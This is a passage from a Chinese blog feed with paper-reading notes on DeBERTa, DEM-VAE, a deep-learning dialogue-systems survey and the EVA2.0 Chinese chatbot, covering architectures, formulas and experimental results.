<h2 id="总结">总结</h2>
<p>读到这里，这篇论文已经没有读下去的必要了。把阅读经验分享出来，希望大家读论文的时候也加以辩证，不要迷信顶会论文，尤其是不开源代码和模型的论文。</p>
<p>科研路漫，诸君共勉。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>问答</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>VAE</tag>
        <tag>问答</tag>
        <tag>负面案例</tag>
      </tags>
  </entry>
  <entry>
    <title>DeBERTa: 注意力解纠缠和解码加强版的 BERT</title>
    <url>/blog/2022/09/04/DEBERTA/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>DeBERTa 是微软于去年在《DEBERTA: DECODING-ENHANCED BERT WITH
DIS-ENTANGLED ATTENTION》中提出的预训练模型， 论文收录于 ICLR
2021 中。DeBERTa (<strong>De</strong>coding-enhanced
<strong>BERT</strong> with disentangled <strong>a</strong>ttention)，
顾名思义，相较于普通的 BERT，DeBERTa 加强了其解码能力，解耦了注意力。DeBERTa 第一次在 SuperGLEU 基准上超越了人类，
在 MNLI、SQuAD、RACE 数据集上相较于 RoBERTa 也有较大的提升（0.9%-3.6%）。</p>
<span id="more"></span>
<p>DeBERTa 的模型和代码开源在 <a href="https://github.com/microsoft/DeBERTa1">github</a>。
现在 SuperGLEU 上的第一已经是 ST-MoE-32B 了，不过排在 DeBERTa 之前的模型参数量似乎都是 DeBERTa 的数倍，
这说明 DeBERTa 还是很有读一下的必要的。</p>
<h2 id="介绍">介绍</h2>
<p>DeBERTa 对于 BERT 共两个改进点，注意力解耦与增强掩码解码。具体体现在：</p>
<p><strong>注意力解纠缠。</strong>BERT 中，不同类型的 embedding 求和作为最终的表征（例如
token embedding、position embedding）。
DeBERTa 对每个单词使用两个向量进行表示，分别对内容、位置进行编码。单词间的注意力权重由解纠缠矩阵分别根据其内容和相对位置计算。</p>
<p><strong>增强的掩码解码器。</strong>DeBETa 也是使用掩码语言模型进行预训练，与 BERT 类似。在这个任务设定下，被掩码词的绝对位置有时是很重要的。
例如 “a new <strong>store</strong> opened beside the new
<strong>mall</strong>."这句话，如果对"store"和"wall" 进行掩码，两者的上下文、语义都接近，但是句法作用是不同的（例如谁是主语）。
这些细微差距很大程度上与绝对位置相关，因此 DeBERTa 在 softmax 层前合并了绝对位置嵌入。
在该层中，模型基于聚合上下文和绝对位置预测被掩码的单词。</p>
<p>另外，论文还提出了一种新的虚拟对抗训练方法，用于微调 plm 到下游的 NLP 任务。该方法有效地提高了模型的泛化能力。</p>
<h2 id="架构">架构</h2>
<h3 id="解耦注意力">解耦注意力</h3>
<p>对于位置<span class="math inline"> \(i\)</span> 的 token，论文使用两个向量<span class="math inline"> \(\{H_i\},\{P_{i|j}\}\)</span> 分别代表它的内容嵌入和与位置<span class="math inline"> \(j\)</span>token 的相对距离。位置<span class="math inline"> \(i\)</span> 与位置<span class="math inline"> \(j\)</span> 的 token 间的注意力分数可以分解为下面四个部分：
<span class="math display">\[
\begin{aligned}
A_{i,j}&amp;=\{H_i,P_{i|j}\}\times\{H_j,P_{j|i}\}^T\\
&amp;=H_iH_i^T+H_iP_{j|i}^T+P_{i|j}H_j^T+P_{i|j}P_{j|i}^T
\end{aligned}
\]</span>
也就是说，一对 token 间的注意力权重可以用内容到内容、内容到位置、位置到内容、位置到位置四个注意力的解纠缠矩阵进行计算。</p>
<p>传统的相对位置嵌入方法只使用一个单独的嵌入矩阵，计算相对位置偏差，再用于计算注意力分数。这相当于只使用了上述公式中的 “位置到位置” 注意力。论文认为位置到内容也很重要，建模了位置和内容间的交叉关系。此外，由于 DeBERTa 本身使用的就是相对位置嵌入，所以直接将上述公式中的位置到位置注意力部分删除了。</p>
<p>接下来就是使用两套 Query、Key 矩阵，分别将内容、位置嵌入映射到 query、key，然后求解注意力分数了。</p>
<h3 id="掩码解码增强">掩码解码增强</h3>
<p>为了将绝对位置信息融入到 MLM 预测中，DeBERTa 在在解码掩码字时只使用绝对位置作为补充信息，在 Transformer 层中使用相对位置信息。因此，论文称 DeBERTa 的解码组件为增强掩码解码器（Enhanced
Mask Decoder，EMD），其结构如下所示，由 n 个共享权重的块堆叠而成。<span class="math inline">\(H\)</span> 代表前一层 Transformer 输出的隐藏状态，<span class="math inline">\(I\)</span> 代表解码所须的信息，例如绝对位置嵌入或前一层 EMD 的输出。第一层 EMD 的<span class="math inline"> \(I\)</span> 是绝对位置嵌入信息，后续层的<span class="math inline"> \(I\)</span> 是前一层 EMD 的输出。</p>
<p><img src="decoder-layer.png"></p>
<p>在实证研究中，论文比较了这两种使用绝对位置的方法，发现 EMD 的效果要好得多。论文推测，BERT 使用的较早的合并绝对位置可能会妨碍模型学习足够的相对位置信息。而且 EMD 的共享参数也没有过多增加模型参数量。</p>
<h2 id="微调">微调</h2>
<p>DeBERTa 使用了一种虚拟对抗训练算法，Scale-invariant-Fine-Tuning
(SiFT)，是 Miyato 等人 (2018) 中描述的算法的变体。</p>
<p>虚拟对抗训练是一种提高模型泛化能力的正则化方法。通过改进模型对对抗样本的鲁棒性实现。对抗样本是通过对输入进行小的扰动来创建的。在 NLP 中，是在单词嵌入进行扰动，而非原始单词序列。然而，嵌入向量的取值范围在不同的词和模型中是不同的。对于具有数十亿个参数的大型模型，方差会变得更大，导致对抗训练的一些不稳定性。</p>
<p>论文受层标准化启发，提出了 SiFT 算法，通过对归一化的词嵌入应用扰动来提高训练的稳定性。具体来说，将 DeBERTa 微调到下游的 NLP 任务时，SiFT 首先将词嵌入向量归一化为随机向量，然后对归一化后的嵌入向量进行扰动。实验发现，规范化大大提高了微调模型的性能。这种改进在较大的 DeBERTa 模型中更为突出。</p>
<h2 id="实验">实验</h2>
<p>论文在数个 NLU 基准上测试了 DeBERTa。</p>
<h3 id="大模型">大模型</h3>
<p>与 BERT 相同的设定预训练 DeBERTa，区别在于使用的是 BPE 子词模型。预训练使用了 96 个 V100，20 天。下面是 GLEU 榜单的结果。</p>
<p><img src="GLEU.png"></p>
<p>下面是 MNLI、SQuAD 等基准上的结果。</p>
<p><img src="SQuADs.png"></p>
<p>可以看出 DeBERTa 已经超过了自回归的 XLNET，可见其性能。</p>
<h3 id="小模型">小模型</h3>
<p>base 模型的设置与 BERT-base 一致，12 层的架构。结果如下，可以看出相较于 XLNET 和 RoBERTa 是有明显改进的。</p>
<p><img src="base.png"></p>
<h3 id="消融实验">消融实验</h3>
<p>为了验证结果，论文首先重新训练了一个 RoBERTa-base，作为基准。</p>
<p>消融实验主要测试了三种变体：</p>
<ul>
<li>-EMD：没有增强掩码解码器，也就是跟 BERT 一样直接 softmax</li>
<li>-C2P：没有内容 - 位置间的注意力</li>
<li> -P2C：没有位置 - 内容间的注意力。由于 XLNET 也使用了相对位置偏差，这种设置接近接近于 XLNET+EMD</li>
</ul>
<p><img src="ablation.png"></p>
<p>从表格可以看出，删除 DeBERTa 中的任何一个组件都会导致性能的大幅下降，尤其是在 SQuAD 数据集上。</p>
<h3 id="亿">15 亿</h3>
<p>为了测试 DeBERTa 的上限，论文还构建了一个 48 层，共计 15 亿参数的 DeBERTa，首次以单个模型在 SuperGLUE 上超过了人类，集成性能也取得了第一名，具体分数如下。</p>
<p><img src="1.5B.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文其实回答了一个蛮重要的问题，相信 NLP 新人刚了解 BERT 的时候，或多或少都会对 embedding 直接相加有一些疑问。解纠缠和绝对位置的融合，同时兼顾了绝对位置的句法信息，和相对位置的邻接关系。解纠缠也使得各个 embedding 更为灵活结合。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://aestheticisma.github.io/2021/11/24/deberta/">DeBERTa
论文解读 - Fan's Blog (aestheticisma.github.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>DEBERTA</tag>
      </tags>
  </entry>
  <entry>
    <title>DEM-VAE</title>
    <url>/blog/2021/07/30/DEM-VAE/</url>
    <content><![CDATA[<h2 id="序言">序言</h2>
<p>DEM-VAE 是字节跳动 AI LAB 团队于 2020 年发表的《Dispersed Exponential
Family Mixture VAEs for Interpretable Text
Generation》论文中提出的模型，论文收录在 ICML 中。论文名直译为 “用于<strong>可解释</strong>文本生成的<strong>分散指数族混合</strong>
VAE ”。</p>
<span id="more"></span>
<h2 id="题外话">题外话</h2>
<p>最近实习面试结束了，回来更新博客了。“黄色的树林里分出两条路，可惜我不能同时去涉足”，最近有些感慨。看到这篇博客的人，希望这篇博客能对你有所帮助，也希望你天天开心。</p>
<h2 id="简介">简介</h2>
<p>连续型 VAE 的隐变量难以解释分散属性，例如主题、对话动作等。这一点与 VQ-VAE 的动机相似。然而只使用分散隐变量的 VAE 的表达能力有限，隐变量<span class="math inline"> \(c\)</span>​只包含<span class="math inline"> \(log(\#c)\)</span>​位的信息，其中<span class="math inline"> \(\#c\)</span>​为<span class="math inline"> \(c\)</span>​​可选值的数量。（这里的意思应该是信息论中的 “信息量”，默认隐变量服从均匀分布，各值取得的概率相等，信息量<span class="math inline"> \(-log(1/\#c)=log(\#c)\)</span>​。）</p>
<p>混合高斯分布的 VAE（GM-VAE）提供了一种自然的想法，将分散隐变量与连续隐变量结合：每个高斯分布代表一个分散属性值，分量的值代表属性相同的句子。在理想情况下，不同高斯分布的均值与方差应该差别很大。然而 GM-VAE 容易出现模式崩溃问题，这使得不同高斯分布的均值与方差非常接近，GM-VAE 退化为只有一个高斯分量的普通 VAE。如下图所示：</p>
<p><img src="example.png"></p>
<p>在本文中，作者证明了模式崩溃问题不仅存在于 GM-VAE 中，而是具有指数族混合先验分布的 VAE（EM-VAE）的普遍问题，由证据下界中的一个分散项引起。进而，作者提出了一个船新的 DEM-VAE，在 EM-VAE 的目标函数里引入了额外一项分散项。按照论文的说法，DEM-VAE 虽然适度减小了句子的似然（由于引入了新的损失项），但是在 rPPL（reverse
perplexity）与 BLEU 得到了更好的结果，并且能够有效地避免模式崩溃问题。</p>
<h2 id="模式崩溃vs后验崩塌">模式崩溃 vs 后验崩塌</h2>
<p>普通的 VAE 会面临后验坍塌（KL 散度消失）的问题，具体而言，KL 损失项在训练之初迅速变为 0。而本文要解决的是模式崩溃问题，是指先验分布中的多个模式崩溃为一个模式。模式崩溃会后验坍塌之间无必然联系。在后验坍塌未出现时，也可能出现模式崩溃。</p>
<p>虽然本文采用的解决方案与之前的解决后验坍塌的方案有些相似：找到目标函数中导致问题的那一项并削弱它的影响。但是本文采用的解决方案只引入了一个启发式的分散项，而不是整个 KL 损失项。</p>
<h2 id="解决方法">解决方法</h2>
<h3 id="混合指数族vae">混合指数族 VAE</h3>
<p>混合指数族 VAE 是指使用混合指数族分布作为先验分布的 VAE（<a href="https://en.wikipedia.org/wiki/Exponential_family">Exponential
family -
Wikipedia</a>），最为常见的就是混合高斯分布的 VAE，GM-VAE，它的先验分布为混合的高斯分布。GM-VAE 使用一个分散变量<span class="math inline"> \(c\)</span> 代表不同的高斯成分，连续隐变量<span class="math inline"> \(z\)</span> 依赖于<span class="math inline"> \(c\)</span>。如下图所示：</p>
<p><img src="gm-vae.png"></p>
<p>其中，实现为依赖关系，虚线为变分后验。其中，<span class="math inline">\(p(c)\)</span>​可以近似为均匀分布，<span class="math inline">\(p_\eta(z|c)\)</span>​为指数族分布，例如高斯分布。</p>
<p>测试时：从先验分布<span class="math inline"> \(p(c)\)</span> 中采样一个<span class="math inline"> \(c\)</span>，然后从<span class="math inline"> \(c\)</span> 对应的高斯分布中采样隐变量<span class="math inline"> \(p(z|c)\)</span>，接着投喂到解码器<span class="math inline"> \(p(x|z)\)</span> 中。</p>
<p>训练时：通过最大化边际似然<span class="math inline"> \(\int\sum_cp_\eta(z,c)p_\theta(x|z)dz\)</span>​​进行训练是不可行的。与 VAE 一样，使用近似后验分布<span class="math inline"> \(q_\phi(z,c|x)=q_\phi(z|x)q_\phi(c|x)\)</span>​作为<span class="math inline"> \(p(z,c|x)\)</span>​​​的估计，进一步改为优化如下所示的证据下界：</p>
<p><img src="elbo.png"></p>
<h3 id="模式崩溃问题">模式崩溃问题</h3>
<p>作者通过研究 ELBO 目标函数，将导致模式崩溃的原因定位到<span class="math inline"> \(\mathcal R_c\)</span> 与<span class="math inline"> \(\mathcal
R_z\)</span> 中。作者从指数族分布的参数化定义出发，将损失项<span class="math inline"> \(\mathcal R_z,\mathcal
R_c\)</span>​重写为 KL 平均正则项与分散项<span class="math inline"> \(\mathcal L_d\)</span>​​。 <span class="math display">\[
\mathcal L_d=\mathbb E_{q_\phi(c|x)}A(\eta_c)-A(\mathbb
E_{q_\phi(c|x)}\eta_c)&gt;=0
\]</span> 作者得出结论，最小化分散项<span class="math inline"> \(\mathcal
L_d\)</span>​使得先验分布的加权方差（即模式崩溃趋势）。这一部分的数学推导较为复杂，有兴趣的可以去看看原文。因此，作者提出在损失函数中加入一项正的分散项来抵消这一趋势，最终损失函数如下所示：
<span class="math display">\[
L(\theta;x)=ELBO+\beta \cdot \mathcal L_d
\]</span> 其中，<span class="math inline">\(\beta\)</span>​是一个超参数，通过调整<span class="math inline"> \(\beta\)</span>​​来达到平衡模式崩溃与正常训练。</p>
<h3 id="dem-vae">DEM-VAE</h3>
<p>在上述方法基础上，作者发现，使用额外的互信息项能够进一步优化可解释性，这一部分可以在实验结果中看到。互信息项在之前的工作中用于缓解 KL 散度消失的问题，定义如下：
<span class="math display">\[
\mathcal L_{mi}=\mathcal H(c)-\mathcal H(c|x)=\mathbb E_x\mathbb
E_{q_\phi(c|x)}(logq_\phi(c|x)-logq_\phi(c))
\]</span>
公式部分介绍完毕。在模型结构上，编码器为 GRU 等循环单元、解码器为一个语言模型。</p>
<h2 id="实验">实验</h2>
<h3 id="模式崩溃实验结果">模式崩溃实验结果</h3>
<p><img src="mode-collapse-result.png"></p>
<p>可以看出，同时引入互信息项和分散项的 VAE（DGM-VAE，DEM-VAE）的各个分量分布有着较为明显的分类边界，没有出现模式崩溃问题。</p>
<h3 id="文本生成">文本生成</h3>
<p>作者使用四个指标：逆困惑度、BLEU、词级 KL 散度、负对数似然来评估文本生成的质量。其中，逆困惑度是指一个 LSTM 语言模型，从 VAE 的先验分布中采样的数据上进行训练，再在测试集上进行评估。实验结果如下：</p>
<p><img src="lg-result.png"></p>
<p>可以看到，正如前文作者所说，由于引入了额外的分散项，使得 NLL（负对数似然）相较基线模型更大，但是 rPPL，BLEU 等指标上取得了更好的结果。</p>
<h2 id="总结">总结</h2>
<p>这篇论文也是离散 VAE 的一种尝试，在混合高斯分布的基础上，引入额外的分散项来解决模式崩溃问题。这使得模型的解释性更强。与之前介绍过得 EQ-VAE 相比，隐变量可以表征更多信息。感觉还是很有意义的工作，就是有点难懂。。。</p>
<h2 id="参考">参考</h2>
<p><a href="https://www.iczhiku.com/hotspotDetail/q7K2UUl4a6Isl4ZlEzOrgg==">ICML
2021 | DEM-VAE：一类新的可解释文本生成模型 - IC 智库
(iczhiku.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>文本生成</category>
      </categories>
      <tags>
        <tag>VAE</tag>
      </tags>
  </entry>
  <entry>
    <title>对话系统综述</title>
    <url>/blog/2022/02/08/DialogueSystem-Survey/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来读一篇对话系统综述。《Recent Advances in Deep Learning Based
Dialogue Systems: A Systematic
Survey》是由南洋理工大学于 2021 年发表的论文，目前收录在 arxiv 中。该文调研了对话系统中的历史研究工作，并从模型和系统两个方面进行分析，确定了可能的未来研究方向。此外，本文还涵盖了相关框架、数据集的介绍。</p>
<span id="more"></span>
<p>具体而言：</p>
<ul>
<li>模型类型层面，分析广泛应用于对话系统的不同模型的原理、特点和应用。</li>
<li>系统类型层面，讨论对比面向任务的对话系统和开放域对话系统。</li>
</ul>
<h2 id="背景">背景</h2>
<p>按照应用，对话系统通常可以分为两类：</p>
<p><strong>面向任务的对话系统（Task-oriented dialogue
systems）</strong>，用于解决特定领域的特定问题，例如机票预订等。传统的面向任务的对话系统往往以流水线结构组织，包含四个基本模块：自然语言理解、对话状态跟踪、策略学习和自然语言生成。近期工作探索使用端到端的方法，以实现更好的效果。</p>
<p><strong>开放域对话系统（Open-domain dialogue
systems）</strong>，旨在不受域的限制地与用户聊天，通常完全由数据驱动。开放域对话系统通常可以分为三类：</p>
<ul>
<li><strong>生成系统。</strong>使用 Seq2Seq 模型将用户输入和历史消息生成回复，可以灵活生成上下文相关的回复，但有时缺乏连贯性并且乏味（例如我不知道）。</li>
<li><strong>基于检索的系统。</strong>根据用户输入从语料库中检索回复，受有限语料库的影响，有时检索到的回复与对话上下文相关性较弱。</li>
<li><strong>集成系统。</strong>结合生成和检索的方法，从二者中选出最优的。</li>
</ul>
<p>此外，生成系统还可以用于改进检索得到的回复。</p>
<p>传统的对话系统大多基于有限状态的、基于统计学习和机器学习方法。基于有限状态的系统易于实现并且可以生成自然的回复，应用于早期的一些场景固定、对话流程确定的产品中。基于统计学习与机器学习的方法通常使用模板填充来处理任务，相较基于有限状态的系统，要更为灵活。但由于模板固定，应用场景和回复的多样性也受到限制。</p>
<p>深度学习的发展则提高了对话系统的性能，其广泛应用于各种 NLP 任务中，也是近些年的研究热点。</p>
<h2 id="神经模型">神经模型</h2>
<p>本节讨论的模型包括：卷积神经网络 (CNNs)、循环神经网络 (RNNs)、Vanilla
序列到序列模型、分层循环编码器 - 解码器
(HRED)、记忆网络、注意力网络、Transformer、指针网络和
CopyNet、深度强化学习模型、生成对抗网络 (GAN)、知识图增强神经网络。</p>
<h3 id="cnn">CNN</h3>
<p><strong>卷积神经网络</strong>（<strong>Convolutional Neural
Networks，CNN</strong>）包含卷积层，池化层和前向层，架构如下图所示。输入为长度为 7，特征维度为 5 的序列，使用 6 个卷积核得到 6 个特征图，池化后拼接得到 6 维向量，接一个全连接层后进行分类。</p>
<p><img src="CNN.png"></p>
<p>卷积核的操作如下。其中，m 和 n 代表结果矩阵行列的索引，f 是输入矩阵，h 是卷积核。滑动窗口使得卷积层能够捕获局部特征，池化层则用于扫描产生全局特征，赋予了 CNN 局部和全局感知能力。而参数共享机制可以降低模型的复杂度。
<span class="math display">\[
G(m,n)=(f*h)(m,n)=\sum_j\sum_k h(j,k)f(m-j,n-k)
\]</span>
由于这些特性，CNN 广泛应用于 CV 中，在 NLP 中也得到了一定应用。CNN 是很好的文本特征提取器，但它们可能不是理想的序列编码器。虽然一些对话系统直接使用 CNN 作为编码器编码语言和知识，但是大多数历史最佳对话系统选择在编码文本信息之后，使用 CNN 作为层次特征抽取器。这是由于 CNN 的固定输入长度（输入尺寸改变，全连接层参数也需要改变）和有限的卷积跨度（难以捕捉长距离依赖）。</p>
<p>通常，CNN 用于处理编码信息的对话系统主要有两种情况：</p>
<ul>
<li>应用 CNN 基于来自编码器的特征向量提取特征。从 character-level
embeddings 中抽取特征，证明了 CNN 的层级抽取能力。</li>
<li>在响应检索任务中提取特征图。使用单独的编码器对对话上下文和候选响应进行编码，使用
CNN
作为从编码对话上下文和候选响应计算的相似度矩阵的提取器。实验表明，该方法可以在响应检索任务中取得良好的性能。</li>
</ul>
<p>近几年较新的工作不选择 CNN 作为对话编码器的主要原因是，它们无法连续、灵活地跨时间序列提取信息。</p>
<h3 id="rnn">RNN</h3>
<p>标准神经网络和 CNN 的两个限制在于：假设数据不同位置相互独立；输入为固定长度。对于存在依赖、长度可变的输入序列，网络性能受到限制。循环神经网络（RNN）应运而生。公式的介绍可以参考我的博客<a href="https://tqnwhz.github.io/blog/2021/07/22/rnns/#more">循环神经网络 RNN 及其变体 GRU、LSTM
| 一隅 (tqnwhz.github.io)</a>，这里就不再赘述。</p>
<p>在对话系统中，RNN 多用于编码器和解码器。编码器用于编码对话上下文、对话状态、对话历史以及外部知识等信息。解码器通过 greedy
search 或者 beam search 进行解码。</p>
<h3 id="hred">HRED</h3>
<p><strong>HRED（Hierarchical Recurrent
Encoder-Decoder）</strong>是一个上下文感知的 Seq2Seq 模型，使用两个层次的 RNN 对 token-level 和 turn-level 的序列进行建模，架构如下图所示。token-level
RNN 编码器序列得到序列表征（同时也是解码器），turn-level
RNN 编码对话历史的序列表征，得到当前的上下文向量，并作为解码器的初始状态。</p>
<p><img src="HRED.png"></p>
<p>HRED 还有一些变体。例如 VHRED 在解码阶段引入隐变量，以建模更复杂的序列依赖关系。最近在对话相关任务中的许多工作都应用了基于
HRED
的框架来捕获分层对话特征。其中有一些改进工作，例如参考 Transformer 引入自注意力，引入新的层次捕获全局知识、主题信息等。</p>
<h3 id="memory-network">Memory Network</h3>
<p>记忆网络（Memory
Network）是解决有关外部知识问题的重要网络。诸如 LSTM 类的模型，虽然有记忆功能，但记忆模块太小（只有一个固定维度的向量），无法精确地记录全部内容。因此 Weston
et al. (2014) 提出了记忆网络，包含四个模块：</p>
<ul>
<li>记忆模块：存储记忆事实表示</li>
<li> I（Input）模块：将输入的记忆事实映射到嵌入式表示</li>
<li> G（Generalization）模块：决定记忆模块的更新，简单起见可以直接将新记忆插入，不进行遗忘和更新</li>
<li> O（Output）模块：根据输入和现有的记忆状态输出</li>
<li> R（Response）模块：根据 O 模块输出产生最终响应</li>
</ul>
<p>端到端的记忆网络架构如下，流程分为三个阶段：</p>
<ul>
<li><strong>权重计算：</strong>使用模型 A、B 分别将输入记忆和输入查询映射为向量，计算权重<span class="math inline"> \(p_i=Softmax(u^Tm_i)\)</span> 代表查询<span class="math inline"> \(u\)</span> 与记忆<span class="math inline"> \(m_i\)</span> 的关系。</li>
<li><strong>记忆选择：</strong>使用模型 C 将输入记忆编码为嵌入向量<span class="math inline"> \(c_i\)</span>，并计算加权和<span class="math inline"> \(o=\sum
p_ic_i\)</span>。这实际上跟 Attention 类似，是一种 soft-alignment。</li>
<li><strong>最终预测：</strong>将记忆和查询的和映射为概率向量，即<span class="math inline"> \(\hat \alpha=Softmax(W(o+u))\)</span>。</li>
</ul>
<p><img src="MemoryNetwork.png"></p>
<p>记忆网络广泛用于 QA、面向任务的对话系统中，记忆模块用于存储外部知识等信息。记忆网络的思想也在很多模型中得到了体现。</p>
<h3 id="注意力-transformer">注意力 &amp; Transformer</h3>
<p>为解决 Seq2Seq 将输入序列编码为固定维度向量带来的信息损失，Bahdanau et
al. (2014)
提出注意力机制用于机器翻译任务。其思想是解码的每一步与整个输入序列关联，公式描述如下：
<span class="math display">\[
P(y_i|y_{t&lt;i})=g(y_{i-1},s_i,c_i)\\
s_i=f(s_{i-1},y_{i-1},c_i)\\
c_i=\sum_{j=1}^{T_x}\alpha_{ij}h_j
\]</span> 其中，h 和 s 分别为编码器和解码器的隐藏状态，i 代表时间步，<span class="math inline">\(y\)</span> 代表输出的 token。g 和 f 为计算输出和更新隐藏状态的函数，由 RNN 的种类决定。<span class="math inline">\(c_i\)</span> 为解码的第 i 步与整个输入序列的注意力结果，<span class="math inline">\(\alpha_{ij}\)</span> 为注意力分数，计算公式为：
<span class="math display">\[
\alpha_{ij}=\frac{exp(e_{ij})}{\sum_{k=1}^{T_x}exp(e_{ik})} \\
e_{ij}=a(s_{i-1},h_j)\\
\]</span> a 是相关性度量函数，根据注意力的类型有不同的形式，<span class="math inline">\(\alpha_{ij}\)</span> 即是相关性上进行归一化（Softmax）。注意力的图示如下：</p>
<p><img src="Attention.png"></p>
<p>此后，注意力机制大行其道，基本成为 Seq2Seq 的标配。但是由于 RNN 的不可并行性、难以捕捉长距离依赖等缺点，研究者提出了 Transformer，详细的介绍可参考我的博客 <a href="https://tqnwhz.github.io/blog/2021/08/14/Transformer/">Transformer
| 一隅</a>。</p>
<p>... 待补充</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://blog.csdn.net/u014577702/article/details/117825782">Recent
Advances in Deep Learning-based Dialogue
Systems_北风吹过的秋 - CSDN 博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/31170263">论文笔记 - HRED 与
VHRED - 知乎 (zhihu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/32257642">论文笔记 - Memory
Networks 系列 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>对话系统</category>
        <category>综述</category>
      </categories>
      <tags>
        <tag>自然语言处理</tag>
        <tag>对话系统</tag>
        <tag>综述</tag>
      </tags>
  </entry>
  <entry>
    <title>智源 EVA2.0: 聊天机器人 EVA 加强版</title>
    <url>/blog/2022/03/24/EVA2-0/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>EVA 2.0 是智源、清华在论文《EVA2.0: Investigating Open-Domain Chinese
Dialogue Systems withLarge-Scale
Pre-Training》中提出的对话模型，论文于 3.17 登陆 arxiv，也就是一周前。EVA2.0 旨在探究数据质量、模型架构、训练方法、解码策略等因素的影响，而不是进一步扩张模型和数据。经过以上优化后，仅 300M 参数的 EVA
2.0 就达到了 2.8B 的 EVA 1.0 的水平。代码和模型见 <a href="https://github.com/thu-coai/EVA">thu-coai/EVA</a>。</p>
<span id="more"></span>
<h2 id="数据">数据</h2>
<p>论文提出了相关性、通顺性、娱乐性等指标用于分析数据质量，并进行数据处理。</p>
<h3 id="质量指标">质量指标</h3>
<h4 id="相关性">相关性</h4>
<p>相关性可以反映上下文和回复间的连贯性、参与度，可以通过一些直觉公式进行估计，或者训练一个 NLU 分类模型。</p>
<p>直觉来看，上下文和回复越相关，同时包含在二者中的单词越多。因此，这一部分分数定义为上下文<span class="math inline"> \(C\)</span> 和回复<span class="math inline"> \(R\)</span> 之间的单词覆盖率，具体公式为: <span class="math display">\[
S_1=\sum_{w_i\in C,w_j\in R} dist(w_i,w_j)^\tau I(w_i=w_j)
\]</span> 其中，<span class="math inline">\(dist(w_i,w_j)\)</span> 为<span class="math inline"> \(w_i\)</span> 和<span class="math inline"> \(w_j\)</span> 在对话中的轮次距离，<span class="math inline">\(\tau\)</span> 用于调整分数。</p>
<p>训练模型的方法，论文在 LCCC 数据集上训练了一个<span class="math inline"> \(BERT_{BASE}\)</span> 模型，用于判别上下文和回复是否对应，在测试集上得到了 93.0% 的准确度和 0.86 的 F1 分数。这一部分分数公式如下，也就是分类的<span class="math inline"> \(logits\)</span>。 <span class="math display">\[
S_2=logp(1|C,R)
\]</span>
很显然，神经网络的方法更健壮一些。训练过程和细节论文未提，猜测应该就是正例 + 随机构建负例进行分类吧。不过这里也有一个有趣的地方。LCCC 数据集数据集是 BERT 分类 + 规则过滤进行清洗的，BERT 是在人工标注的 10w 条数据上训练的。EVA
1.0 版本中的 WDC-Dialog 只提到了规则过滤。2.0 从 LCCC 数据集去训练分类器，相当于是逆向了 LCCC 的分类模型，省去了人工标注数据的成本。</p>
<h4 id="通顺性">通顺性</h4>
<p>论文使用 kenlm，一个统计语言模型工具，来计算每个句子的概率，对话的通顺分数是每轮次分数之和，公式如下：
<span class="math display">\[
S_3=-\frac1n\sum logP(w_1^i,w_2^i,\dots,w_{|u_i|}^i)
\]</span></p>
<h4 id="娱乐性">娱乐性</h4>
<p>由于中文社交媒体上有很多娱乐明星的粉丝（点名微博了属于是），相关对话中会包含一些不想要的信息，并且这些语言习惯也和正常聊天有所差异。因此，论文计算娱乐明星在对话中的占比，计算娱乐分数。</p>
<h3 id="数据改进">数据改进</h3>
<ul>
<li><strong>数据集改进</strong>：作者发现有些数据集不适合开放域对话场景，例如京东客服对话 JDDC 数据集，使用它训练会导致说话口吻像电商客服，因此将其从 WDC-Dialog 中移除。</li>
<li><strong>回复数量改进</strong>：来自微博等社交媒体的数据集中，存在一个上下文对应相当多回复的情况。这些回复非常相似有时会严重影响性能。因此作者为每个上下文设置了最大回复数量并进行过滤。</li>
<li><strong>规则过滤</strong>：作者在 EVA
1.0 的规则上做了进一步的改进，例如将繁体字转为简体字，移除不合理的连续标点符号等。</li>
<li><strong>基于分类器的过滤</strong>：根据质量分数的加权<span class="math inline"> \(S=\alpha S_1+\beta S_2+\gamma
S_3\)</span> 对样本进行过滤，去除质量分数低于阈值的样本。</li>
</ul>
<h3 id="数据扩展">数据扩展</h3>
<p>来自社交媒体的数据会夹杂很多的流行语，而它们在日常对话中并不常见，这会导致偏差。因此，作者还从公开来源收集了以下四种数据，共计 12GB。</p>
<ul>
<li>电影和电视剧的对话字幕</li>
<li>小说和故事中的对话</li>
<li>百度知道的问答对</li>
<li>已有的公开众包对话：DuConv，KdConv，DuRecDial，NaturalConv</li>
</ul>
<h3 id="数据统计信息">数据统计信息</h3>
<p>下表展示了 EVA 2.0 和 1.0 的数据集对比。可以看到 EVA
2.0 的数据集不足 1.0 版本的<span class="math inline"> \(1/3\)</span>，但显著提升了质量。相关性、通顺性的提升与数据调整中的过滤方式大致有个对应关系，例如规则过滤主要改善通顺性。另外，个人感觉数据调整中会根据质量分数过滤，再采用质量分数来评估似乎欠妥。可能再各自随机采样样本进行人工标注更有说服力一些。</p>
<p><img src="statistics.png"></p>
<h2 id="模型">模型</h2>
<p>模型还是 Seq2Seq 的 Transformer，不过和 EVA
1.0、t5 不一样的是，使用的是 scaled
Attention，即计算 Attention 的时候除以了<span class="math inline"> \(\sqrt
d\)</span>。论文主要讨论了两个模型的两个配置：层数和角色信息。</p>
<p>基于 Seq2Seq 的对话模型的编码器和解码器层数往往不是一致，解码器要比编码器更深以达到更好的生成效果。但是，更深的编码器也能提高对话上下文理解能力。因此，论文在控制参数规模情况下，尝试了不同的层数比例。</p>
